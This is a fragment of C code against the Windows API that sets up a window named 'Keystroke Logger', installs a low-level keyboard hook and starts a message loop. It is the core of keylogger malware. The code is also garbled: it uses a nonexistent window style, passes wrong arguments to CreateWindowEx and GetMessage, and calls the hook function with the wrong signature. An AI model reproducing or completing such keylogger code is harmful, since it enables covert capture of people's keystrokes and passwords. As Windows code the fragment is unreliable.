    HWND hwnd = CreateWindowEx(WS_HIDE, "Keystroke Logger", 0, 0, 0, 0, WS_OVERLapped | WS_VISIBLE, NULL, NULL, 0, NULL);

    // Register the keyboard hook
    hkKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHookCallback);

    // Start the loop to process messages
    lastTime = GetTickCount();
    while (GetMessage(hwnd, &msg) > 0) {
